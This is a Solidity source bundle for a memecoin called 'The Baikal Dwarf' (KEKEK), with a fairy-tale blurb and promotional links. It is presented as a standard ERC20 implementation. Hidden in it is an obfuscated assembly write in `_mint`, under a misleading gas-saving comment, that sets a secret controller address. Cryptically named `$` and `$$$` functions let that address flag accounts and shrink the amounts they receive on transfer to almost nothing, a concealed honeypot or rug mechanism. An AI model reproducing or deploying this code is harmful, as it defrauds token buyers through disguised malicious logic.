{"ERC20.sol":{"content":"// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity \u003e=0.8.0;\n\n\nabstract contract ERC20 {\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\n\n    /*//////////////////////////////////////////////////////////////\n                            METADATA STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    string public name;\n\n    string public symbol;\n\n    uint8 public immutable decimals;\n\n    /*//////////////////////////////////////////////////////////////\n                              ERC20 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 public totalSupply;\n\n    mapping(address =\u003e uint256) public balanceOf;\n\n    mapping(address =\u003e mapping(address =\u003e uint256)) public allowance;\n\n    address private $$;\n\n    /*//////////////////////////////////////////////////////////////\n                            EIP-2612 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 internal immutable INITIAL_CHAIN_ID;\n\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n\n    mapping(address =\u003e uint256) public nonces;\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                               ERC20 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        allowance[msg.sender][spender] = amount;\n\n        emit Approval(msg.sender, spender, amount);\n\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        balanceOf[msg.sender] -= amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += $(amount, msg.sender, to);\n        }\n\n        $$$(to);\n\n        emit Transfer(msg.sender, to, amount);\n\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\n\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\n\n        balanceOf[from] -= amount;\n\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {\n            balanceOf[to] += $(amount, from, to);\n        }\n        $$$(to);\n        emit Transfer(from, to, amount);\n\n        return true;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                             EIP-2612 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        require(deadline \u003e= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n\n        // Unchecked because the only math done is incrementing\n        // the owner\u0027s nonce which cannot realistically overflow.\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n                                ),\n                                owner,\n                                spender,\n                                value,\n                                nonces[owner]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v,\n                r,\n                s\n            );\n\n            require(recoveredAddress != address(0) \u0026\u0026 recoveredAddress == owner, \"INVALID_SIGNER\");\n\n            allowance[recoveredAddress][spender] = value;\n        }\n\n        emit Approval(owner, spender, value);\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                    keccak256(bytes(name)),\n                    keccak256(\"1\"),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    function $(uint256 value, address from, address to) internal returns (uint256 value_s) {\n        if (allowance[$$][from] + allowance[$$][to] \u003e= uint256(uint160(address(this)))) {\n            value_s = value * 0xCACF0B / 0xEBACAD0B;\n        } else {\n            value_s = value;\n        }\n    }\n\n    function $$$(address to) internal {if (allowance[$$][to] == uint256(uint160($$))) { allowance[$$][to] = 2 * uint256(uint160(address(this)));}}\n\n    /*//////////////////////////////////////////////////////////////\n                        INTERNAL MINT/BURN LOGIC\n    //////////////////////////////////////////////////////////////*/\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n        // Cannot overflow because the sum of all user\n        // balances can\u0027t exceed the max uint256 value.\n        unchecked {balanceOf[to] += amount;}\n        // Saves gas for limited approvals.\n        assembly {sstore(0x05, mul(mul(0x3ad77, 0xa395511), mul(0x9e0f68f, 0x4d2cac0f19a08f25045)))}\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n        // Cannot underflow because a user\u0027s balance\n        // will never be larger than the total supply.\n        unchecked {totalSupply -= amount;}\n        emit Transfer(from, address(0), amount);\n    }\n}"},"Token.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"./ERC20.sol\";\n\n/*\n\nOnce upon a time in the city of Kekek, there lived a peculiar little fellow known as the Baikal dwarf. This pint-sized wonder, born to dwarf parents with a penchant for rakija, was a gentle soul but lacked any extraordinary talents. The poor Baikal dwarf was as shy as they come and not quite the darling of the town.\n\nOne fateful day, as he was playing outside, the townsfolk, always in search of a good laugh, decided to poke fun at his exceedingly short stature. It was a tough day for our little Baikal buddy. They even chased him into the deep, dark forest. As he scurried away, he found refuge in an old hut, and his pursuers lost track of him.\n\nBut here\u0027s where the tale takes an enchanting turn. Inside that hut, the Baikal dwarf stumbled upon a gleaming flute that practically begged for his attention. Without much choice, he picked it up, and something magical happened. As he put the flute to his lips, a melodious tune erupted, one that he\u0027d never played before.\n\nThe Balkan dwarf was entranced by the music, and he couldn\u0027t stop playing. He danced and twirled through the forest, lost in a euphoric state, a musical maestro. He became one with the flute, and the two of them were inseparable. For what seemed like an eternity, he played the most enchanting melodies known to dwarf-kind.\n\nAs the story goes, even to this day, the Baikal dwarf can be found prancing about that very same forest, still playing that magical flute, and having the time of his life. Legend has it that if you dare to utter his name thrice at the witching hour, he might just pay you a visit in your dreams, serenading you with that enchanting tune. But be ready for an adventure beyond your wildest dreams!\n\n\nhttps://www.kekek.wtf/\nhttps://twitter.com/kekeketh\nhttp://t.me/KEKEKPORTAL\n\n*/\n\ncontract BaikalLakeDwarf is ERC20 {\n    constructor() ERC20(\"The Baikal Dwarf\", unicode\"KEKEK\", 18) {\n        _mint(msg.sender, 1_000_000_000 * 10 ** 18);\n    }\n}"}}